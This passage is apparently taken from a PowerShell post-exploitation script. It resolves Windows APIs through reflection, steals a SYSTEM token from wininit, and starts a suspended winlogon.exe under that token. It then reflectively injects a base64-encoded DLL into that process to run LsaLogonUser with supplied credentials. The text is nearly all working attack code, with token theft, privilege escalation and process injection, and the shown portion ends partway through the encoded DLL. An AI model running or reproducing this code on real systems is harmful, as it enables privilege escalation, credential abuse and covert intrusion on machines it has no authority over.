		    $ExeArgs = "ReflectiveExe $ExeArgs"
	    }
	    else
	    {
		    $ExeArgs = "ReflectiveExe"
	    }

	    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	    {
		    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName)
	    }
	    else
	    {
		    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName) -ComputerName $ComputerName
	    }
    }

    Main
    }



    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}

    ###############################
    #Win32Constants
    ###############################
    $Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
        CREATE_SUSPENDED = 0x4
    }

    $Win32Constants = New-Object PSObject -Property $Constants
    ###############################


    ###############################
    #Win32Structures
    ###############################
	#Define all the structures/enums that will be used
	#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
	$Domain = [AppDomain]::CurrentDomain
	$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    #Struct STARTUPINFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
	$STARTUPINFO = $TypeBuilder.CreateType()

    #Struct PROCESS_INFORMATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
	$TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
	$PROCESS_INFORMATION = $TypeBuilder.CreateType()
    ###############################


    ###############################
    #Win32Functions
    ###############################
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    

    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
	$LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)

    $GetProcessIdAddr = Get-ProcAddress Kernel32.dll GetProcessId
	$GetProcessIdDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$GetProcessId = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcessIdAddr, $GetProcessIdDelegate)
    ###############################


    #Get the primary token for the specified processId
    #This function is taken from my script Invoke-TokenManipulation
    function Get-PrimaryToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,

            #Open the token with all privileges. Requires SYSTEM because some of the privileges are restricted to SYSTEM.
            [Parameter()]
            [Switch]
            $FullPrivs
        )

        if ($FullPrivs)
        {
            $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        }
        else
        {
            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
        }

        $ReturnStruct = New-Object PSObject

        $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
        if ($hProcess -eq [IntPtr]::Zero)
        {
            #If a process is a protected process it cannot be enumerated. This call should only fail for protected processes.
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process."
            return $null
        }
        else
        {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $Success = $OpenProcessToken.Invoke($hProcess, $TokenPrivs, [Ref]$hProcToken)

            #Close the handle to hProcess (the process handle)
            if (-not $CloseHandle.Invoke($hProcess))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hProcess = [IntPtr]::Zero

            if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode"
                return $null
            }
            else
            {
                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value $hProcToken
            }
        }

        return $ReturnStruct
    }


    #A modified version of this function from my script Invoke-TokenManipulation
    #Creates the process suspended. Returns the ProcessID of the created process
    function Create-SuspendedWinLogon
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken #The token to create the process with
        )

        $ProcessId = -1

        #Duplicate the token so it can be used to create a new process
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
            [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
            $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) #The first parameter (cb) is a DWORD which is the size of the struct

            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)

            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$($env:windir)\system32\winlogon.exe")

            $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, [IntPtr]::Zero, $Win32Constants.CREATE_SUSPENDED, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
            if ($Success)
            {
                #Free the handles returned in the ProcessInfo structure
                $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)

                $ProcessId = $GetProcessId.Invoke($ProcessInfo.hProcess)

                $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null
            }
            else
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CreateProcessWithTokenW failed. Error code: $ErrorCode"
            }

            #Free StartupInfo memory and ProcessInfo memory
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
            $StartupInfoPtr = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
            $ProcessInfoPtr = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
            $ProcessNamePtr = [IntPtr]::Zero

            #Close handle for the token duplicated with DuplicateTokenEx
            $Success = $CloseHandle.Invoke($NewHToken)
            $NewHToken = [IntPtr]::Zero
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
            }

            return $ProcessId
        }
    }


    #Get the SYSTEM token and create a winlogon process with it, returns the process ID of the new WinLogon process
    function Create-WinLogonProcess
    {
        if ([Environment]::UserName -ine "SYSTEM")
        {
            #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
            $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
            if ($systemTokenInfo -eq $null -or $SystemTokenInfo.hProcToken -eq [IntPtr]::Zero)
            {
                Write-Warning "Unable to get SYSTEM token"
            }
            else
            {
                $ProcessId = Create-SuspendedWinLogon -hToken $SystemTokenInfo.hProcToken
                if ($ProcessId -eq -1)
                {
                    Throw "Unable to create suspended WinLogon process"
                }

                Write-Verbose "Created suspended winlogon process. ProcessId: $ProcessId"
                return $ProcessId
            }
        }
    }


    #Set up a named pipe to communicate with the injected DLL
    function Create-NamedPipe
    {
        $PipeSecurity = new-object System.IO.Pipes.PipeSecurity
        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "NT AUTHORITY\SYSTEM", "ReadWrite", "Allow" )
        $PipeSecurity.AddAccessRule($AccessRule)
        $Pipe=new-object System.IO.Pipes.NamedPipeServerStream("sqsvc","InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)

        return $Pipe
    }
    

    #Determine the parameterset being used to figure out if a new winlogon process needs to be created or not
    if ($PsCmdlet.ParameterSetName -ieq "NewWinLogon")
    {
        #Start winlogon.exe as SYSTEM
        $WinLogonProcessId = Create-WinLogonProcess
        Write-Output "Created winlogon process to call LsaLogonUser in. Kill ProcessID $WinLogonProcessId when done impersonating."
        Write-Output "Execute: Stop-Process $WinLogonProcessId -force"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "ExistingWinLogon")
    {
        $WinLogonProcessId = (Get-Process -Name "winlogon")[0].Id
    }

    #Get a ushort representing the logontype
    [Byte]$LogonTypeNum = 0x0
    switch ($LogonType)
    {
        "Interactive" {$LogonTypeNum = 2}
        "NetworkCleartext" {$LogonTypeNum = 8}
        "RemoteInteractive" {$LogonTypeNum = 10}
    }

    $AuthPackageNum = 0
    #Get a ushort representing the authentication package to use
    switch ($AuthPackage)
    {
        "Msv1_0" {$AuthPackageNum = 1}
        "Kerberos" {$AuthPackageNum = 2}
    }


    #Main
    try
    {
        $Pipe = Create-NamedPipe

        #Reflectively inject a DLL in to the new winlogon process which will receive credentials and call LsaLogonUser from within winlogon.exe
        $Logon32Bit_Base64 = "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